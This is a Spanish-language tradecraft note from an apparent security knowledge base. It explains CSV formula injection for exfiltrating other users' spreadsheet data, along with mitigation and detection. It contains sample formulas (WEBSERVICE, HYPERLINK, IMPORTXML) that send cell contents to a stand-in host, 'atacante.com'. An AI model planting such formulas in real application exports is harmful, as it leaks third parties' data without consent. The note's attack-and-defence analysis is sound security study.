---
tipo: tradecraft
clase: "[[CWE-1236 - Improper Neutralization of Formula Elements in a CSV File]]"
eje: capacidad
implementacion: "Plantar una fórmula que lee otras celdas del export y las envía a un servidor propio cuando el analista abre el archivo"
opsec: ruidoso
telemetria: ["[[Registro del WAF]]", "[[Log de auditoría de la aplicación]]", "[[Consulta DNS saliente]]"]
requisitos: [campo-de-usuario-que-se-exporta-a-csv, formato-que-evalúa-fórmulas]
coste: bajo
alternativas: ["[[CSV - ejecución de comandos por fórmula]]", "[[XSS - almacenado]]"]
probado: nunca
contexto: [web-generica]
aliases:
  - CSV exfil
  - WEBSERVICE injection
tags:
  - dominio/web
---

# CSV - fuga de datos por fórmula

## Cuándo lo elijo

Es la rama a probar primero, porque no depende de configuraciones peligrosas del lado del analista —a diferencia de la ejecución de comandos—. Se reconoce cuando la aplicación **exporta datos de usuario a CSV o planilla** y algún campo que el atacante controla —nombre, comentario, dirección, empresa— termina en ese export.

El objetivo es exfiltrar el resto de la planilla: los datos de **otros** usuarios del informe, que el atacante no vería de otro modo. Si el objetivo es ejecución en la máquina del analista, la rama es [[CSV - ejecución de comandos por fórmula]].

## Por qué funciona

Las hojas de cálculo tienen funciones que hacen peticiones de red, y una fórmula puede componer una URL con el contenido de otras celdas. El atacante planta en su campo una fórmula que lee celdas vecinas y las manda a su servidor:

```
=WEBSERVICE(CONCATENATE("http://atacante.com/x?d=",A1,B1,C1))
```

Cuando el analista abre el CSV en Excel, esa fórmula:

1. Lee `A1`, `B1`, `C1` —celdas de otras filas, con datos de otros usuarios—.
2. Compone una URL con esos datos.
3. **Hace la petición** a `atacante.com`, exfiltrando el contenido.

Otras funciones que exfiltran, según la aplicación:

- `HYPERLINK("http://atacante.com/?"&A1,"clic")` — necesita un clic, menos fiable.
- `IMPORTXML`, `IMPORTDATA`, `IMPORTFEED` — Google Sheets, disparan solas.
- `WEBSERVICE` — Excel, dispara sola.

Los payloads por aplicación están en [[CSV - matriz de referencia]]. La exfiltración es la capacidad más fiable del dominio porque muchas de estas funciones se ejecutan **sin interacción** al abrir el archivo, y no dependen de DDE ni de macros.

La ventaja sobre [[XSS - almacenado]] es que el objetivo no es el navegador sino la planilla del **analista**, que ve datos que el atacante no alcanza por la web —el informe completo de usuarios—.

## Cómo falla

Falla cuando la exportación **prefija las celdas** que empiezan con carácter de fórmula con una comilla `'` o un espacio, tratándolas como texto. Es la mitigación correcta, y del lado del export, no de la entrada.

Falla cuando el programa que abre el archivo pide confirmación antes de ejecutar funciones de red externas —Excel y Sheets muestran advertencias para `WEBSERVICE`/`IMPORT*` en configuraciones endurecidas— y el analista la rechaza.

Y falla cuando el export es a un formato que no evalúa fórmulas, o cuando la aplicación entrecomilla y escapa correctamente.

## Coste

Bajo. Plantar la fórmula es escribir en un campo del formulario. El reconocimiento es confirmar que ese campo se exporta —pedir el export propio y buscar el valor— y que el formato evalúa fórmulas.

El costo es tener un servidor que reciba la exfiltración y esperar a que un analista abra el informe, que puede tardar —es un ataque diferido, no inmediato—.

## Huella esperada

Firma escribible del lado de la entrada, impacto ciego del lado del analista:

- El campo plantado empieza con **`=`, `+`, `-`, `@`** seguido de un nombre de función como `WEBSERVICE` o `HYPERLINK`. Un campo de nombre o comentario que empieza con `=WEBSERVICE(` no ocurre en datos legítimos, así que es una firma de buena fidelidad sobre la entrada, que ve [[Registro del WAF]] y queda en [[Log de auditoría de la aplicación]] como el contenido almacenado. Es la misma familia que las firmas de inyección —un metacarácter de estructura, acá de fórmula, en un campo de datos—.
- La exfiltración en sí ocurre en la máquina del analista y **el vault no la ve**: la petición sale de su Excel, no del servidor. Lo único que podría verse es la [[Consulta DNS saliente]] del dominio del atacante desde la red interna, si el análisis se hace ahí y esa telemetría existe.

La detección aprovechable es la firma sobre la entrada, escribible: alertar campos almacenados que empiezan con carácter de fórmula. Refuerza el candidato transversal de firma de inyección —el `=` inicial es otro metacarácter de estructura—, aunque acá el sink no es web sino una planilla. Anotado en [[MOC - CSV injection]].
